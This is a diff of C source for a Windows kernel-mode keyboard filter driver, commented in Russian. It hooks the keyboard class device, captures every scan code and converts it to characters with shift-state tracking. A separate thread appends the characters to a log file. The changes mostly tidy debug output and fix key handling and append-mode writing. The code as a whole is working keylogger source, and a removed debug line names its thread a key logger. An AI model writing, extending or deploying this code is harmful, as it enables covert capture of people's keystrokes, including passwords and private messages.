@@ -28,20 +28,20 @@ NTSTATUS ReadCompleted(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID Context)
 
 				if (keys[i].Flags == KEY_MAKE)
 					DbgPrint("%s\n", "Key Down");
+
 				//Выделяем пул неперемещаемой памяти и помещаем его в список
 				KEY_DATA* kData = (KEY_DATA*)ExAllocatePool(NonPagedPool, sizeof(KEY_DATA));
 				kData->keyData = (char)keys[i].MakeCode;
 				kData->keyFlags = (char)keys[i].Flags;
-				//Добавляем скан код в список
 				//Вставляем узел в конец списка
 				ExInterlockedInsertTailList(&pDeviceExtension->listHead,
-					&kData->listNode,
-					&pDeviceExtension->spinlock);
+											&kData->listNode,
+											&pDeviceExtension->spinlock);
 				//Увеличиваем счётчик семафора на 1
 				KeReleaseSemaphore(&pDeviceExtension->semaphore,
-					0,
-					1,
-					FALSE);
+									0,
+									1,
+									FALSE);
 				
 			//}
 		}
@@ -51,33 +51,32 @@ NTSTATUS ReadCompleted(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID Context)
 	if (pIrp->PendingReturned)
 		IoMarkIrpPending(pIrp);
 	--REQUESTS;
-	DbgPrint("RC\t%d\n", REQUESTS);
 	return pIrp->IoStatus.Status;
 }
 
 NTSTATUS DispatchSkip(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
 {
-	DbgPrint("Entering dispatchskip\n");
 	//Отправляем IRP пакет ниже по стеку, не изменяя его
 	IoSkipCurrentIrpStackLocation(pIrp);
 	return IoCallDriver(((PDEVICE_EXTENSION)pDeviceObject->DeviceExtension)->pKeyboardDevice, pIrp);
 }
 
-//Обработка запросов на чтение
 NTSTATUS DispatchRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
 {
-	DbgPrint("Entering DispatchRead\n");
-
-	
 	//Настраиваем текущий указатель стека так, чтобы он указывал на область памяти нижележащего драйвера
 	IoCopyCurrentIrpStackLocationToNext(pIrp);
 
 	//По выполнении запроса вызываем указанную функцию
-	IoSetCompletionRoutineEx(pDeviceObject, pIrp, ReadCompleted, pDeviceObject, TRUE, TRUE, TRUE);
+	IoSetCompletionRoutineEx(pDeviceObject,
+							pIrp,
+							ReadCompleted,
+							pDeviceObject,
+							TRUE,
+							TRUE,
+							TRUE);
 
 	//Увеличиваем количество запросов
 	++REQUESTS;
-	DbgPrint("DR \t%d\n", REQUESTS);
 
 	//Передаём IRP-пакет следующему драйверу
 	//pKeyboardDevice - указатель на следующий драйвер в цепочке
@@ -87,7 +86,6 @@ NTSTATUS DispatchRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
 //Функция выгрузки драйвера
 VOID Unload(PDRIVER_OBJECT pDriverObject) 
 {
-	//ReadCompleted()
 	DbgPrint("Entering unload\n");
 	PDEVICE_EXTENSION pDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;
 
@@ -99,8 +97,6 @@ VOID Unload(PDRIVER_OBJECT pDriverObject)
 	LARGE_INTEGER timeout;
 	timeout.QuadPart = 1000000; // 0,1 c
 	KeInitializeTimer(&timer);
-	DbgPrint("1st point\n");
-	DbgPrint("UL\t%d\n", REQUESTS);
 	while (REQUESTS > 0)
 	{
 		KeSetTimer(&timer, timeout, NULL);
@@ -110,27 +106,22 @@ VOID Unload(PDRIVER_OBJECT pDriverObject)
 							FALSE,
 							NULL);
 	}
-	DbgPrint("2nd point\n");
 	//Устанавливаем флаг завершения потока и освобождаем семафор
 	pDeviceExtension->bClosedThread = TRUE;
 	KeReleaseSemaphore(&pDeviceExtension->semaphore,
 						0,
 						1,
 						TRUE);
-	DbgPrint("3rd point\n");
 	//Ждём уничтожения потока
 	KeWaitForSingleObject(pDeviceExtension->pThreadObj,
 		Executive,
 		KernelMode,
 		FALSE,
 		NULL);
-	DbgPrint("4th point\n");
 	//Закрываем файл
 	ZwClose(pDeviceExtension->hLog);
-	DbgPrint("5th point\n");
 	//Удаляем устройство
 	IoDeleteDevice(pDriverObject->DeviceObject);
-	DbgPrint("6th point\n");
 	return;
 }
 
@@ -146,14 +137,14 @@ NTSTATUS InitializeKeyboardFilter(PDRIVER_OBJECT pDriverObject)
 							NULL,
 							FILE_DEVICE_KEYBOARD,	//Тип устройства
 							0,
-							TRUE, //FALSE
+							TRUE, //FALSE ???
 							&pDeviceObject);
 
-	//Устройство создано
 	if (NtStatus != STATUS_SUCCESS) {
 		DbgPrint("Installing keyboard filter error\n");
 		return NtStatus;
 	}
+
 	//Установка флагов
 	pDeviceObject->Flags |= (DO_BUFFERED_IO | DO_POWER_PAGABLE);
 	pDeviceObject->Flags &= (~DO_DEVICE_INITIALIZING);
@@ -167,13 +158,13 @@ NTSTATUS InitializeKeyboardFilter(PDRIVER_OBJECT pDriverObject)
 	CCHAR cName[40] = "\\Device\\KeyboardClass0";
 	STRING strName;
 	UNICODE_STRING ustrDeviceName;
-
 	RtlInitAnsiString(&strName, cName);
 	RtlAnsiStringToUnicodeString(&ustrDeviceName, &strName, TRUE);
 
 	//Добавляем устройство в стек
-	//В &pKeyboardDeviceExtension->pKeyboardDevice хранится адрес нижележащего устройства
-	IoAttachDevice(pDeviceObject, &ustrDeviceName, &pDeviceExtension->pKeyboardDevice);
+	IoAttachDevice(pDeviceObject,
+					&ustrDeviceName,
+					&pDeviceExtension->pKeyboardDevice); // здесь хранится адрес нижележащего устройства
 	//Освобождаем место, выделенное под строку
 	RtlFreeUnicodeString(&ustrDeviceName);		
 	DbgPrint("Keyboard filter installed\n");
@@ -193,10 +184,10 @@ VOID ThreadForWriting(PVOID pContext)
 		//Ждём освобождения семафора
 		//Если семафор ненулевой, процесс продолжает свою работу
 		KeWaitForSingleObject(&pDeviceExtension->semaphore,
-			Executive,
-			KernelMode,
-			FALSE,
-			NULL);
+								Executive,
+								KernelMode,
+								FALSE,
+								NULL);
 		//Извлекаем первый элемент списка
 		//?? Используется критическая секция
 		pListEntry = ExInterlockedRemoveHeadList(&pDeviceExtension->listHead,
@@ -209,29 +200,30 @@ VOID ThreadForWriting(PVOID pContext)
 		//Получаем указатель на данные в структуре pListEntry ???
 		kData = CONTAINING_RECORD(pListEntry, KEY_DATA, listNode);
 		//Преобразуем сканкод в клавишу
-		///??? {0}
-
-		//Convert the scan code to a key code
 		char keys[3] = { 0 };
-		Scancode2Key(kData->keyData, keys);
-
+		Scancode2Key(pDeviceExtension, kData, keys);
 		if (keys != 0)
 		{
 			//Если хэндл правильный
 			if (pDeviceExtension->hLog != NULL)
 			{
+				//Переменная для записи в конец файла
+				LARGE_INTEGER offset;
+				offset.HighPart = -1;
+				offset.LowPart = FILE_WRITE_TO_END_OF_FILE;
+
 				//Записываем в файл
 				IO_STATUS_BLOCK ioStatus;
 				NTSTATUS NtStatus = ZwWriteFile(
-					pDeviceExtension->hLog,
-					NULL,
-					NULL,
-					NULL,
-					&ioStatus,
-					&keys,
-					strlen(keys),
-					NULL,
-					NULL);
+									pDeviceExtension->hLog,
+									NULL,
+									NULL,
+									NULL,
+									&ioStatus,
+									&keys,
+									strlen(keys),
+									&offset,
+									NULL);
 				//Error??
 				if (NtStatus != STATUS_SUCCESS)
 					DbgPrint("Writing scancode to file\n");
@@ -239,10 +231,6 @@ VOID ThreadForWriting(PVOID pContext)
 					DbgPrint("Scan code successfully written\n");
 			}
 		}
-		//??? added to break infinite loop in the end
-		//--REQUESTS;
-		DbgPrint("TFW\t%d\n", REQUESTS);
-
 	}
 	return;
 }
@@ -250,7 +238,6 @@ VOID ThreadForWriting(PVOID pContext)
 //Функция инициализации потока
 NTSTATUS InitializeThread(PDRIVER_OBJECT pDriverObject)
 {
-	//PDEVICE_EXTENSION pDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;
 	PDEVICE_EXTENSION pDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;
 
 	//Инициализируем переменную, отвечающую за работу потока
@@ -262,9 +249,10 @@ NTSTATUS InitializeThread(PDRIVER_OBJECT pDriverObject)
 											NULL,
 											(HANDLE)0,
 											NULL,
-											ThreadForWriting,
-											pDeviceExtension);
-	if (NtStatus != STATUS_SUCCESS) {
+											ThreadForWriting,	//Точка входа потока
+											pDeviceExtension);	//Передаваемый параметр
+	if (NtStatus != STATUS_SUCCESS) 
+	{
 		DbgPrint("Thread initializing error\n");
 		return NtStatus;
 	}
@@ -275,9 +263,6 @@ NTSTATUS InitializeThread(PDRIVER_OBJECT pDriverObject)
 							KernelMode,
 							(PVOID*)&pDeviceExtension->pThreadObj, //Указатель на объект потока
 							NULL);
-
-	DbgPrint("Key logger thread initialized; pThreadObject =  %x\n",
-		&pDeviceExtension->pThreadObj);
 
 	//??? Закрываем дескриптор потока
 	ZwClose(hThread);
@@ -316,7 +301,7 @@ NTSTATUS CreateFile(PDRIVER_OBJECT pDriverObject)
 								NULL);
 	//Создаём файл
 	NtStatus = ZwCreateFile(&pDeviceExtension->hLog,
-							GENERIC_WRITE,
+							GENERIC_WRITE | FILE_APPEND_DATA,
 							&objAttr,
 							&fileStatus,
 							NULL,
@@ -342,59 +327,78 @@ NTSTATUS CreateFile(PDRIVER_OBJECT pDriverObject)
 
 }
 
-char* Scancode2Key(char scanCode, char* keys)
+char* Scancode2Key(PDEVICE_EXTENSION pDeviceExtension, KEY_DATA* kData, char* keys)
 {
 	char key;
-	BOOLEAN lShift = 0;
-	BOOLEAN rShift = 0;
-	BOOLEAN space = 0;
-	BOOLEAN ctrl = 0;
-	BOOLEAN alt = 0;
 
-	key = lowerKeys[scanCode];
+	//Получаем скан-код клавиши
+	key = lowerKeys[kData->keyData];
+
 	switch(key)
 	{
 		case LSHIFT:
-			lShift = TRUE;
+			if (kData->keyFlags == KEY_MAKE)	//Если клавиша нажата
+				pDeviceExtension->kState.shift = TRUE;
+			else
+				pDeviceExtension->kState.shift = FALSE;
 			break;
 
 		case RSHIFT:
-			rShift = TRUE;
+			if (kData->keyFlags == KEY_MAKE)	//Если клавиша нажата
+				pDeviceExtension->kState.shift = TRUE;
+			else
+				pDeviceExtension->kState.shift = FALSE;
 			break;
 
+/*
 		case CTRL:
-			ctrl = TRUE;
+			if (kData->keyFlags == KEY_MAKE)	//Если клавиша нажата
+				pDeviceExtension->kState.ctrl = TRUE;
+			else
+				pDeviceExtension->kState.ctrl = FALSE;
 			break;
 
 		case ALT:
-			alt = TRUE;
-
-		case SPACE:
-			space = TRUE;
+			if (kData->keyFlags == KEY_MAKE)	//Если клавиша нажата
+				pDeviceExtension->kState.alt = TRUE;
+			else
+				pDeviceExtension->kState.alt = FALSE;
 			break;
 
+		case SPACE:
+			if (kData->keyFlags == KEY_MAKE)	//Если клавиша нажата
+				pDeviceExtension->kState.space = TRUE;
+			else
+				pDeviceExtension->kState.space = FALSE;
+			break;
+*/
+
 		case ENTER:
-			keys[0] = 0x0D;
-			keys[1] = 0x0A;
+			if (kData->keyFlags == KEY_BREAK)
+			{
+				keys[0] = 0x0D;
+				keys[1] = 0x0A;
+			}
 			break;
 
 		default:
-			if (lShift == TRUE || rShift == TRUE)
-				keys[0] = upperKeys[scanCode];
+			if (kData->keyFlags == KEY_BREAK)
+			{
+			if (pDeviceExtension->kState.shift == TRUE)
+				keys[0] = upperKeys[kData->keyData];
 			else
-				keys[0] = lowerKeys[scanCode];
+				keys[0] = lowerKeys[kData->keyData];
+			}
+
 	}
 	return keys;
 }
 
 //Входная точка
-//PDRIVER_OBJECT - адрес объекта драйвера
-//PUNICODE_STRING - путь в реестре к подразделу драйвера
 NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
 {
 	DbgPrint("Entering driver entry point\n");
-	//REQUESTS = 0;
-	DbgPrint("EP= %d", REQUESTS);
+
 	NTSTATUS NtStatus = 0; //STATUS_SUCCESS;
 	unsigned int i = 0;
 
@@ -409,6 +413,13 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath
 
 	//Помещаем наше устройство в стек.
 	NtStatus = InitializeKeyboardFilter(pDriverObject);
+
+	/*
+	*	Процедура DispatchRead выполняется на IRQL уровне DISPATCH_LEVEL, это означает, что
+	*	все файловые операции запрещены. Чтобы обойти это ограничение создаётся поток, который
+	*	работает на IRQL уровне PASSIVE_LEVEL, получает нажатия через общий связанный список
+	*	и записывает их в файл.
+	*/
 
 	//Поскольку на уровне IRQL == DISPATCH_LEVEL запрещены операции ввода/вывода,
 	//то необходимо создать поток, работающий на IRQL уровне - PASSIVE_LEVEL  
